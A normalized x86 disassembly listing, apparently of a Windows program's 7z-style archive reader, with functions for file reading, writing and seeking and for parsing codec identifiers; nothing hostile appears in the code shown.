mov esi eax
mov eax [ esp + 0xc4 ]
sub eax ecx
add esp 0x10
sub ebx ecx
sbb [ esp + 0x10 ] 0x0
mov [ esp + 0xb4 ] eax
test esi esi
jne r-xdata
mov [ esp + 0xb4 ] ebx
cmp ebx 0x40000
jae r-xdata
mov edx [ esp + 0x4c ]
cmp edx [ esp + 0x50 ]
je r-xdata
cmp [ esp + 0x50 ] ebp
jne r-xdata
test ecx ecx
jne r-xdata
xor esi esi
inc esi
test eax eax
jne r-xdata
push ecx
push edi
call [ edi + 0x4 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp [ esp + 0x18 ] edx
je r-xdata
cmp [ esp + 0x1c ] 0x1
je r-xdata
mov eax [ esp + 0x10 ]
jmp r-xdata
and [ esp + 0x24 ] 0x0
mov [ esp + 0xb4 ] 0x40000
test eax eax
ja r-xdata
sub_403b51
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x24 ]
mov ebp edx
mov ebx ecx
test edi edi
je r-xdata
test esi esi
jne r-xdata
mov [ esp + 0x10 ] 0x40000
test edi edi
ja r-xdata
xor eax eax
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
push ebx
call [ ebx ]
add esp 0xc
test eax eax
jne r-xdata
jb r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0xc
retn
cmp [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] esi
cmp esi 0x40000
jae r-xdata
push 0x6
pop eax
push [ esp + 0x10 ]
push [ esp + 0x18 ]
push ebp
call sub_410c10
add ebp [ esp + 0x1c ]
push [ esp + 0x1c ]
sub esi [ esp + 0x20 ]
push ebx
sbb edi 0x0
call [ ebx + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
test edi edi
ja r-xdata
jb r-xdata
sub_403c0b
xor edx edx
inc edx
cmp [ ecx ] edx
jne r-xdata
xor edx edx
cmp [ ecx + 0x4 ] edx
jne r-xdata
cmp [ ecx + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov ecx [ ecx + 0x8 ]
call sub_403bf3
test eax eax
jne r-xdata
cmp [ ecx + 0x8 ] 0xffffffff
ja r-xdata
mov eax edx
retn
sub_403c36
push ebx
push ebp
push esi
mov esi ecx
push edi
mov ebx [ esi + 0x10 ]
push 0x4
pop ebp
cmp ebx 0x1
jb r-xdata
mov eax ebp
cmp ebx ebp
ja r-xdata
mov edi [ esi ]
mov ecx edi
call sub_403c0b
test eax eax
je r-xdata
xor edx edx
inc edx
cmp ebx edx
jne r-xdata
cmp ebx 0x2
jne r-xdata
cmp [ esi + 0x18 ] edx
jne r-xdata
cmp ebx ebp
jne r-xdata
xor ecx ecx
cmp [ edi + 0x24 ] ecx
ja r-xdata
mov eax [ esi + 0x8 ]
xor ecx ecx
cmp [ eax ] ecx
jne r-xdata
lea ecx [ edi + 0x18 ]
call sub_403c0b
test eax eax
je r-xdata
jb r-xdata
cmp [ esi + 0x14 ] ecx
lea ecx [ edi + 0x30 ]
call sub_403c0b
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
cmp [ edi + 0x20 ] 0xffffffff
ja r-xdata
xor eax eax
jmp r-xdata
cmp [ edi + 0x50 ] 0x303011b
jne r-xdata
cmp [ edi + 0x1c ] edx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor ecx ecx
cmp [ edi + 0x54 ] ecx
jne r-xdata
cmp [ esi + 0x18 ] edx
jne r-xdata
cmp [ edi + 0x48 ] ebp
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] ecx
jne r-xdata
cmp [ edi + 0x4c ] 0x1
jne r-xdata
cmp [ esi + 0x14 ] edx
jne r-xdata
cmp [ esi + 0x18 ] ebp
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] edx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x2
jne r-xdata
cmp [ eax + 0x4 ] ecx
jne r-xdata
cmp [ eax + 0x4 ] 0x6
jne r-xdata
cmp [ edi + 0x20 ] 0x3030103
je r-xdata
cmp [ eax + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x20 ] 0x3030501
jmp r-xdata
cmp [ eax + 0xc ] ecx
jne r-xdata
jne r-xdata
cmp [ esi + 0x14 ] 0x3
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x5
jne r-xdata
cmp [ eax + 0x4 ] ecx
jne r-xdata
cmp [ eax + 0x8 ] ebp
jne r-xdata
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x2
jmp r-xdata
sub_403d8b
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi edx
xorps xmm0 xmm0
movlpd [ ebp - 0x8 ] xmm0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
pop esi
leave
retn
add eax [ ecx + esi * 8 ]
adc edx [ ecx + esi * 8 + 0x4 ]
inc esi
cmp esi edi
jb r-xdata
sub_403db8
sub esp 0x38
push ebx
push ebp
push esi
xor esi esi
push edi
mov edi edx
mov ebx ecx
mov [ esp + 0x10 ] edi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
call sub_403c36
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
mov edx [ ebx + 0x10 ]
mov ebp esi
test edx edx
je r-xdata
xor eax eax
mov eax ebx
mov eax [ ebx + 0xc ]
cmp ecx 0x303011b
jne r-xdata
mov edi [ esp + 0x5c ]
mov [ esp + 0x14 ] esi
mov esi [ esp + 0x58 ]
cmp edx 0x4
jne r-xdata
cmp ebp 0x1
jne r-xdata
cmp eax esi
jne r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
call sub_403d8b
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
add eax [ esp + 0x50 ]
mov ecx [ ebx + ecx * 8 ]
adc edx [ esp + 0x54 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x14 ]
push edx
mov ecx [ ebx + ecx * 8 + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x50 ]
push eax
call sub_4067f0
mov ebx [ esp + 0x34 ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
push 0x2
mov eax [ eax + 0xc ]
pop esi
mov edi [ eax + ebp * 8 ]
mov ecx [ eax + ebp * 8 + 0x4 ]
mov eax ebp
shl eax 0x2
xor edx edx
mov [ esp + 0x3c ] 0x3
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] edx
mov [ esp + 0x1c ] eax
mov eax [ esp + eax + 0x3c ]
mov [ esp + 0x14 ] eax
cmp ebp esi
jae r-xdata
push 0x4
jmp r-xdata
cmp ecx 0x3030103
jne r-xdata
xor edx edx
inc edx
mov ecx edi
call sub_403d8b
mov esi [ edi + 0x8 ]
mov edi [ edi + 0xc ]
cmp ebp 0x3
jne r-xdata
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
or eax ecx
jne r-xdata
jne r-xdata
mov [ esp + 0x18 ] edi
cmp edi edi
jne r-xdata
pop eax
jmp r-xdata
cmp ecx 0x3030501
jne r-xdata
cmp eax esi
jne r-xdata
add eax [ esp + 0x50 ]
mov ecx [ esp + 0x4c ]
adc edx [ esp + 0x54 ]
push edx
push eax
call sub_4067f0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor edx edx
cmp [ ebx + 0x8 ] 0x30101
jne r-xdata
mov ecx [ esp + 0x1c ]
cmp ecx edi
jne r-xdata
cmp ecx edx
ja r-xdata
mov eax esi
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp eax esi
jne r-xdata
mov edx [ esp + 0x5c ]
push ecx
lea eax [ esp + 0x30 ]
push eax
push ecx
mov ecx [ esp + 0x64 ]
mov [ esp + 0x38 ] esi
call sub_406ca3
add esp 0xc
jmp r-xdata
cmp esi esi
jne r-xdata
cmp [ ebx + 0x8 ] 0x21
jne r-xdata
cmp ecx edx
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ esp + 0x18 ]
xor edx edx
cmp eax edx
jne r-xdata
push 0x5
jmp r-xdata
jb r-xdata
mov eax [ esp + 0x60 ]
push edi
push eax
call [ eax ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov edx [ esp + 0x5c ]
push ecx
push ecx
mov ecx [ esp + 0x60 ]
call sub_406c42
pop ecx
pop ecx
mov eax [ esp + 0x20 ]
inc ebp
mov edx [ eax + 0x10 ]
cmp ebp edx
jb r-xdata
push 0x2
xor edx edx
cmp edx edi
jne r-xdata
cmp ecx edx
jne r-xdata
push [ esp + 0x60 ]
mov edx [ esp + 0x50 ]
push edi
push esi
push [ esp + 0x24 ]
mov ecx ebx
push [ esp + 0x2c ]
call sub_403857
push eax
push ecx
mov ecx [ esp + 0x54 ]
mov edx esi
call sub_403b51
pop ecx
pop ecx
jmp r-xdata
mov esi [ esp + 0x58 ]
sub esi edi
add esi [ esp + 0x5c ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] edi
cmp edi [ esp + 0x5c ]
ja r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x64 ]
neg eax
mov [ eax + ecx + 0x4 ] esi
mov [ esp + eax + 0x34 ] edi
jmp r-xdata
test edi edi
jne r-xdata
mov ebx ebp
imul ebx ebx 0x18
add ebx [ eax ]
mov [ esp + 0x2c ] ebx
mov ecx [ ebx + 0x8 ]
call sub_403bf3
test eax eax
je r-xdata
mov eax [ esp + 0x60 ]
push esi
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ esp + 0x64 ]
mov [ ecx + 0x8 ] eax
test eax eax
jne r-xdata
push [ esp + 0x60 ]
mov edx [ esp + 0x50 ]
push edi
push esi
push [ esp + 0x24 ]
mov ecx ebx
push [ esp + 0x2c ]
call sub_4039d2
jmp r-xdata
test eax eax
jne r-xdata
mov edi [ esp + 0x18 ]
mov ecx [ esp + 0x4c ]
push edi
push esi
mov edx eax
call sub_403b51
pop ecx
pop ecx
test eax eax
jne r-xdata
test esi esi
jne r-xdata
add esp 0x14
jmp r-xdata
mov edi [ esp + 0x10 ]
xor esi esi
jmp r-xdata
push [ esp + 0x5c ]
mov eax [ esp + 0x68 ]
push [ esp + 0x5c ]
mov edx [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
push esi
push [ eax + 0x8 ]
push [ esp + 0x44 ]
push [ eax + 0x4 ]
push [ esp + 0x48 ]
push [ eax ]
call sub_406974
add esp 0x20
sub_4040fa
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x24 ]
push ebx
mov ebx [ esp + 0x30 ]
push ebp
push esi
mov esi [ esp + 0x24 ]
push edi
lea ebp [ esp + 0x14 ]
push ebp
push ebx
push [ esp + 0x40 ]
xor edi edi
push eax
push [ esp + 0x40 ]
mov [ esp + 0x28 ] edi
push [ esp + 0x40 ]
mov [ esp + 0x30 ] edi
push esi
mov [ esp + 0x38 ] edi
call sub_403db8
add esp 0x1c
mov esi eax
push [ esp + edi * 4 + 0x14 ]
push ebx
call [ ebx + 0x4 ]
inc edi
pop ecx
pop ecx
cmp edi 0x3
jl r-xdata
mov ecx [ esp + 0x20 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x14
retn
sub_404169
mov eax [ esp + 0x4 ]
push esi
push edi
xor edi edi
neg eax
push edi
sbb eax eax
push 0x80
add eax 0x3
cmp [ esp + 0x14 ] edi
push eax
push edi
mov esi ecx
mov ecx 0x40000000
push 0x1
mov eax 0x80000000
cmovne eax ecx
push eax
push edx
call [ CreateFileW@IAT ]
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax edi
pop edi
pop esi
retn
call [ GetLastError@IAT ]
mov edi eax
sub_4041c3
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
pop esi
jmp [ GetLastError@IAT ]
sub_4041e5
push ecx
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4 ] eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
mov ebx edx
mov esi [ edi ]
mov ebp ecx
test esi esi
jne r-xdata
and [ edi ] 0x0
mov ecx __dos_header
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
pop ecx
pop ecx
retn
mov ecx __dos_header
test esi esi
jne r-xdata
and [ esp + 0x10 ] 0x0
push 0x0
lea eax [ esp + 0x14 ]
push eax
cmp esi ecx
mov eax esi
cmova eax ecx
push eax
push ebx
push [ ebp ]
call [ ReadFile@IAT ]
mov ecx [ esp + 0x10 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
jmp r-xdata
sub_404263
push ecx
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4 ] eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
mov ebx edx
mov esi [ edi ]
mov ebp ecx
test esi esi
jne r-xdata
and [ edi ] 0x0
mov ecx __dos_header
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
pop ecx
pop ecx
retn
mov ecx __dos_header
test esi esi
jne r-xdata
and [ esp + 0x10 ] 0x0
push 0x0
lea eax [ esp + 0x14 ]
push eax
cmp esi ecx
mov eax esi
cmova eax ecx
push eax
push ebx
push [ ebp ]
call [ WriteFile@IAT ]
mov ecx [ esp + 0x10 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
jmp r-xdata
sub_4042e1
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi edx
mov ebx ecx
mov esi [ edi ]
mov edx [ edi + 0x4 ]
mov eax esi
mov cl 0x20
mov [ ebp - 0xc ] esi
call sub_41daa0
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
xor ecx ecx
or ecx esi
mov [ edi + 0x4 ] eax
mov [ edi ] ecx
xor eax eax
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov esi [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push [ ebx ]
call [ SetFilePointer@IAT ]
mov esi eax
mov [ ebp - 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
push 0x2
pop eax
jmp r-xdata
push 0x57
pop eax
jmp r-xdata
sub_4043ea
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov esi edx
cmp [ edi ] ebx
je r-xdata
push [ edi ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x4 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x8 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0xc ]
push esi
call [ esi + 0x4 ]
add esp 0x20
mov ecx edi
pop edi
pop esi
pop ebx
jmp sub_4043ca
cmp [ edi + 0x10 ] ebx
jbe r-xdata
push ebp
mov ebp ebx
mov ecx [ edi ]
add ecx ebp
mov edx esi
call sub_4043b7
inc ebx
add ebp 0x18
cmp ebx [ edi + 0x10 ]
jb r-xdata
pop ebp
sub_40443c
push esi
mov esi [ ecx + 0x10 ]
xor edx edx
test esi esi
je r-xdata
mov eax edx
pop esi
retn
mov eax [ ecx ]
add eax 0x4
add edx [ eax ]
lea eax [ eax + 0x18 ]
dec esi
jne r-xdata
sub_404457
push esi
mov esi [ ecx + 0x14 ]
xor eax eax
test esi esi
je r-xdata
or eax 0xffffffff
mov ecx [ ecx + 0x4 ]
pop esi
retn
inc eax
add ecx 0x8
cmp eax esi
jb r-xdata
cmp [ ecx ] edx
je r-xdata
sub_404475
push esi
xor esi esi
cmp [ ecx + 0x14 ] esi
jbe r-xdata
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x4 ]
add eax 0x4
mov eax esi
pop esi
retn
inc esi
add eax 0x8
cmp esi [ ecx + 0x14 ]
jb r-xdata
cmp [ eax ] edx
je r-xdata
sub_404499
push esi
call sub_40443c
mov esi eax
test esi esi
jne r-xdata
dec esi
jns r-xdata
xor eax eax
xor edx edx
pop esi
retn
mov edx esi
call sub_404475
test eax eax
js r-xdata
jmp r-xdata
mov edx [ ecx + 0xc ]
mov eax [ edx + esi * 8 ]
mov edx [ edx + esi * 8 + 0x4 ]
pop esi
retn
sub_4044ee
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov esi edx
cmp [ edi + 0xc ] ebx
je r-xdata
push [ edi ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x4 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x8 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0xc ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x10 ]
push esi
call [ esi + 0x4 ]
add esp 0x28
mov ecx edi
pop edi
pop esi
pop ebx
jmp sub_4044d4
cmp [ edi + 0x18 ] ebx
jbe r-xdata
push ebp
mov ebp ebx
mov ecx [ edi + 0xc ]
add ecx ebp
mov edx esi
call sub_4043ea
inc ebx
add ebp 0x28
cmp ebx [ edi + 0x18 ]
jb r-xdata
pop ebp
sub_404567
push esi
push edi
mov edi ecx
mov esi edx
push [ edi + 0x30 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x34 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x38 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x3c ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x40 ]
push esi
call [ esi + 0x4 ]
add esp 0x28
lea ecx [ edi + 0x44 ]
mov edx esi
call sub_403718
mov edx esi
mov ecx edi
call sub_4044ee
mov ecx edi
pop edi
pop esi
jmp sub_404549
sub_404731
xor edx edx
sub ecx rw-data
xor eax eax
retn
inc edx
cmp edx 0x6
jb r-xdata
mov al [ ecx + edx + rw-data ]
cmp al [ edx + rw-data ]
jne r-xdata
xor eax eax
inc eax
retn
sub_404755
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov al [ ecx ]
mov [ edx ] al
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
xor eax eax
pop esi
retn
push 0x10
pop eax
pop esi
retn
sub_404777
push ebx
push esi
xor esi esi
push edi
mov edi edx
mov ebx ecx
cmp [ esp + 0x10 ] esi
jbe r-xdata
xor eax eax
lea edx [ esi + edi ]
mov ecx ebx
call sub_404755
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
cmp esi [ esp + 0x10 ]
jb r-xdata
sub_4047a1
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
xor esi esi
mov ebx ecx
mov [ edi ] esi
pop edi
pop esi
pop ebx
leave
retn
movzx eax [ ebp - 0x1 ]
mov ecx esi
shl eax cl
add esi 0x8
or [ edi ] eax
cmp esi 0x20
jl r-xdata
lea edx [ ebp - 0x1 ]
mov ecx ebx
call sub_404755
test eax eax
jne r-xdata
xor eax eax
sub_4047d7
push ecx
push ecx
push ebx
push ebp
push esi
mov esi edx
push edi
lea edx [ esp + 0x13 ]
mov ebp ecx
mov bl 0x80
call sub_404755
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
mov bh [ esp + 0x13 ]
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esp + 0x14 ] edi
movzx eax bl
movzx ecx bh
dec eax
and eax ecx
mov ecx edi
cdq
shl ecx 0x3
call sub_41da80
add [ esi ] eax
adc [ esi + 0x4 ] edx
lea edx [ esp + 0x13 ]
mov ecx ebp
call sub_404755
test eax eax
jne r-xdata
movzx eax [ esp + 0x13 ]
mov ecx [ esp + 0x14 ]
cdq
call sub_41da80
or [ esi ] eax
mov eax [ esp + 0x14 ]
or [ esi + 0x4 ] edx
shr bl 0x1
add eax 0x8
inc edi
mov [ esp + 0x14 ] eax
cmp eax 0x40
jl r-xdata
test bl bh
je r-xdata
jmp r-xdata
xor eax eax
sub_40485d
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi edx
lea edx [ ebp - 0x8 ]
call sub_4047d7
test eax eax
jne r-xdata
pop esi
leave
retn
mov ecx [ ebp - 0x4 ]
test ecx ecx
jne r-xdata
push 0x4
pop eax
mov eax [ ebp - 0x8 ]
cmp eax 0x80000000
jae r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x4000000
jae r-xdata
mov [ esi ] eax
xor eax eax
jmp r-xdata
sub_40489f
cmp [ esp + 0x8 ] 0x0
mov eax [ ecx + 0x4 ]
mov edx [ esp + 0x4 ]
jb r-xdata
add [ ecx ] edx
sub eax edx
mov [ ecx + 0x4 ] eax
xor eax eax
retn
ja r-xdata
push 0x10
pop eax
retn
cmp edx eax
jbe r-xdata
sub_4048c1
push ebp
mov ebp esp
sub esp 0xc
lea edx [ ebp - 0x8 ]
push esi
mov esi ecx
call sub_4047d7
test eax eax
jne r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
mov ecx esi
push [ ebp - 0x8 ]
call sub_40489f
add esp 0x8
sub_4048e9
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
jmp r-xdata
lea edx [ ebp - 0x8 ]
call j_sub_4047d7
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or eax [ ebp - 0x4 ]
je r-xdata
jmp r-xdata
xor eax eax
mov ecx esi
call sub_4048c1
mov ecx esi
pop esi
leave
retn
sub_404918
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
lea edx [ ebp - 0x8 ]
mov esi ecx
call j_sub_4047d7
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
mov edi [ ebp + 0xc ]
or eax [ ebp - 0x4 ]
je r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push 0x10
pop eax
mov ecx esi
call sub_4048c1
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call j_sub_4047d7
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
sub_404968
push ecx
push ecx
push ebx
push esi
mov esi edx
xor ebx ebx
mov eax ecx
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0xe ] bl
mov dl bl
test esi esi
jne r-xdata
mov eax [ esp + 0x1c ]
push esi
push eax
call [ eax ]
mov edi [ esp + 0x20 ]
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
mov edi [ esp + 0x18 ]
mov [ edi ] ebx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov dl bl
push 0x2
pop eax
jmp r-xdata
push ebp
mov ebp ebx
test esi esi
je r-xdata
xor eax eax
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
retn
mov eax [ edi ]
test bl dl
setne cl
shr dl 0x1
mov [ eax + ebp ] cl
inc ebp
cmp ebp esi
jae r-xdata
lea edx [ esp + 0x12 ]
mov ecx eax
call sub_404755
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
jmp r-xdata
pop ebp
mov bl [ esp + 0x12 ]
mov dl 0x80
sub_4049e8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi edx
lea edx [ ebp - 0x1 ]
mov esi ecx
call sub_404755
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp [ ebp - 0x1 ] al
jne r-xdata
xor esi esi
test edi edi
jne r-xdata
push [ ebp + 0xc ]
mov edx edi
push [ ebp + 0x8 ]
mov ecx esi
call sub_404968
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
test edi edi
je r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
mov eax [ ecx ]
mov [ esi + eax ] 0x1
inc esi
cmp esi edi
jb r-xdata
sub_404a4d
push ecx
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x10 ]
push edi
mov eax ecx
push ebx
push ebp
mov edi edx
mov [ esp + 0x14 ] eax
call sub_4049e8
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
pop ecx
retn
push esi
xor esi esi
test edi edi
jne r-xdata
mov eax edi
shl eax 0x2
push eax
push ebx
call [ ebx ]
mov ebx [ esp + 0x24 ]
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
mov [ ebx ] esi
test edi edi
je r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp ]
cmp [ esi + eax ] 0x0
je r-xdata
pop esi
inc esi
cmp esi edi
jb r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x10 ]
lea edx [ eax + esi * 4 ]
call sub_4047a1
test eax eax
jne r-xdata
sub_404ac1
push ecx
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
call sub_4047d7
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
mov esi [ esp + 0x1c ]
mov edx esi
mov ecx edi
call sub_40485d
test eax eax
jne r-xdata
push eax
push 0x9
mov ecx edi
call sub_404918
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi ]
mov ebx [ esp + 0x2c ]
test eax eax
jne r-xdata
shl eax 0x3
push eax
push ebx
call [ ebx ]
pop ecx
pop ecx
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax ecx
push 0x2
pop eax
jmp r-xdata
xor ebp ebp
cmp [ esi ] ebp
jbe r-xdata
lea edx [ esp + 0x10 ]
mov ecx edi
call j_sub_4047d7
test eax eax
jne r-xdata
mov eax [ eax ]
mov ecx edi
lea edx [ eax + ebp * 8 ]
call sub_4047d7
test eax eax
jne r-xdata
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
inc ebp
cmp ebp [ esi ]
jb r-xdata
cmp [ ebp ] 0x0
jne r-xdata
cmp [ esp + 0x10 ] 0xa
jne r-xdata
xor eax eax
cmp [ esi ] 0x0
jne r-xdata
mov ecx edi
call sub_4048c1
cmp [ esp + 0x14 ] 0x0
jne r-xdata
push [ esi ]
push ebx
call [ ebx ]
pop ecx
pop ecx
mov [ ebp ] eax
test eax eax
je r-xdata
and [ ebp ] 0x0
jmp r-xdata
lea edx [ esp + 0x10 ]
mov ecx edi
call j_sub_4047d7
test eax eax
je r-xdata
mov edx [ esi ]
push ebx
push [ esp + 0x2c ]
mov ecx edi
push ebp
call sub_404a4d
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
or eax [ esp + 0x14 ]
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
shl eax 0x2
push eax
push ebx
call [ ebx ]
mov edx [ esp + 0x30 ]
pop ecx
pop ecx
mov [ edx ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
and [ edx ] eax
jmp r-xdata
xor ecx ecx
cmp [ esi ] ecx
jbe r-xdata
mov eax [ ebp ]
mov [ ecx + eax ] 0x0
mov eax [ edx ]
and [ eax + ecx * 4 ] 0x0
inc ecx
cmp ecx [ esi ]
jb r-xdata
sub_404c1a
push ebp
mov ebp esp
push ecx
lea edx [ ebp - 0x1 ]
call sub_404755
test eax eax
jne r-xdata
leave
retn
xor ecx ecx
cmp [ ebp - 0x1 ] cl
push 0x4
pop eax
cmove eax ecx
sub_404c37
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c ] eax
mov eax [ esp + 0x54 ]
push ebx
push ebp
push esi
push edi
mov edi edx
mov ebx ecx
xor esi esi
lea edx [ esp + 0x14 ]
mov [ esp + 0x24 ] edi
mov [ esp + 0x30 ] ebx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x2c ] esi
call sub_40485d
test eax eax
jne r-xdata
mov ecx [ esp + 0x5c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x50
retn
mov ebp [ esp + 0x14 ]
cmp ebp 0x20
ja r-xdata
push 0x4
mov [ edi + 0x10 ] ebp
test ebp ebp
